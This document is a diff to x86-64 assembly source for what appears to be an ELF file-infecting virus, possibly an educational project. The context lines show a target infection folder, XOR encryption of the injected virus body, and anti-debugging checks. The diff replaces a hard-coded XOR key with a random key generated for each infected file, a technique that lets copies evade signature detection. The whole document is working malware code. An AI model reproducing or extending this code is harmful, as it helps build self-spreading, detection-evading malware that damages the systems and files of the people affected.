@@ -487,7 +487,7 @@ infected_folder_2: db "/tmp/test2/", 0
 elf_64_magic: db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
 len_elf_64_magic: equ $ - elf_64_magic
 compressed_data_size2: dq 0x00				; Filled in infected
-key: db "S3cr3tK3y"
+key: times KEY_SIZE dq 0x00
 key_size: equ $ - key
 debugged_message: db "DEBUG DETECTED ;)", 0
 process_message: db "Process detected ;)", 0
@@ -964,12 +964,22 @@ treat_file:
 	mov rax, [new_vaddr]				; *_e_entry = new_vaddr;
 	mov [rdi], rax					; ...
 
+	; generate new key
+	mov rdx, [mappedfile]				; new_key = file_map
+	add rdx, [filesize]				; 	+ filesize
+	add rdx, key - _start				; 	+ (key - _start)
+	mov rdi, [rand_buffer]				; generate_key(rand_buffer, rand_index, new_key)
+	mov rsi, [rand_index]				; ...
+	call generate_key				; ...
+
 	; xor cipher all injected bytes between infection_routine and _end
 	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - _start);
 	add rdi, [filesize]				;
 	add rdi, infection_routine - _start		;
 	mov rsi, [compressed_data_size]			; size = compressed_data_size
-	lea rdx, [rel key]				; key = &key;
+	mov rdx, [mappedfile]				; key = file_map
+	add rdx, [filesize]				; 	+ filesize
+	add rdx, key - _start				; 	+ (key - _start)
 	mov rcx, key_size				; key_size = key_size;
 	call xor_cipher					; xor_cipher(data, size, key, key_size)
 
@@ -1496,6 +1506,44 @@ rand:
 		pop rbp
 		%pop
 		ret					; return y;
+
+; void generate_key(unsigned int *rand_buffer, long *rand_index, uint64_t buf[10]);
+; void generate_key(rdi rand_buffer, rsi rand_index, rdx buf);
+generate_key:
+	xor r8, r8					; counter = 0
+	.generate_loop:
+		cmp r8, KEY_SIZE*8			; if (counter == 80)
+		je .end					;	goto .end;
+
+		push rdx				; save_buf = buf;
+		push rdi				; save_rand_buffer = rand_buffer;
+		push rsi				; save_rand_index = rand_index;
+
+		call rand				; r = rand(rand_buffer, rand_index);
+
+		pop rsi					; rand_buffer = save_rand_buffer;
+		pop rdi					; rand_index = save_rand_index;
+		push rdi				; ...
+		push rsi				; ...
+		push rax				; save_rand = r;
+
+		call rand				; rand(rand_buffer, rand_index);
+
+		shl rax, 32				; res = r << 32 | save_rand;
+		pop rbx					; ...
+		or rax, rbx				; ...
+
+		pop rsi					; rand_buffer = save_rand_buffer;
+		pop rdi					; rand_index = save_rand_index;
+		pop rdx					; buf = save_buf;
+
+		mov [rdx + r8], rax			; buf[counter] = res.
+
+		add r8, 8				; counter += 8;
+		jmp .generate_loop			; goto .generate_loop
+
+	.end:
+		ret					; return;
 
 ; void itoa(uint8_t _buf[10], uint32_t _number);
 ; void itoa(rdi _buf, esi _number);
